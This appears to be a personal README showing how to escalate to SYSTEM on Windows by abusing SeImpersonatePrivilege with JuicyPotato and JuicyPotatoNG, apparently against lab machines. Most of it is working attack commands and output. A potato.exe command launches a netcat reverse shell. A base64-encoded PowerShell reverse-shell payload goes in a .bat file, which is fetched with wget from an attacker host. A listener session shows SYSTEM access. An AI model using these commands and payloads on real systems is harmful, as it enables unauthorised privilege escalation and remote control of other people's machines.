# how to exploit SeImpersonatePrivilege using a juicePotato binary (abusing the golden privileges)

With potato we can easy use the followint command 
```
C:\Users\Public\desktop>potato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.16.29 1234" -t *
```

```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
c:\Users\Public>                                                                                                                                                                                       

C:\Windows\system32>whoami
whoami
nt authority\system 
```

N/B: I have made this simple repostory specificary  for my own use, so i understand what is going on with everything if you wanna more details just google budy


## ATERNATIVE WITH JUICY POTATO AND THIS ONE IS VERY SIMPLE ALSO.
since we know that we can easy use any thing of our choise to get a shell we can try also to create a simple bat file and inside it we can input our powershell encoded reverse shell and transfer it to our target. This technique is very simple than the first approach with juicypotato binary.
```
Encoded payload: inside a file.bat

powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AMwAyACcALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKAAoA

PS C:\temp> wget http://10.10.14.32:8080/a.bat -o a.bat
PS C:\temp> dir

    Directory: C:\temp                                                                                                                                                                                                                        

Mode                LastWriteTime         Length Name                                                                                                                                                                                         
----                -------------         ------ ----
-a----       21/04/2024     00:15           1361 a.bat
-a----       21/04/2024     00:13         153600 potato.exe
-a----       20/04/2024     23:57          27136 spoofer.exe 


N/B: With the payload i have just use nishanga (OnelineTcp payload) and encode it in powershell encoded method to make the script work, simple like that.
```
After we have done this we need now to start our netcat session on our machine and execute the bat file as follows
```
C:\temp


PS C:\temp> .\potato.exe -t * -p C:\temp\a.bat


         JuicyPotatoNG
         by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
[+] CreateProcessAsUser OK
[+] Exploit successful! 
PS C:\temp> 
```

And on our netcat session we get this one 
```
┌──(alienx㉿alienX)-[/usr/share/doc/python3-impacket/examples]
└─$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.32] from (UNKNOWN) [10.10.11.168] 60669
whoami
nt authority\system
PS C:\> dir 
```


# AND WERE DONE WITH JUICEPOTATO BINARY
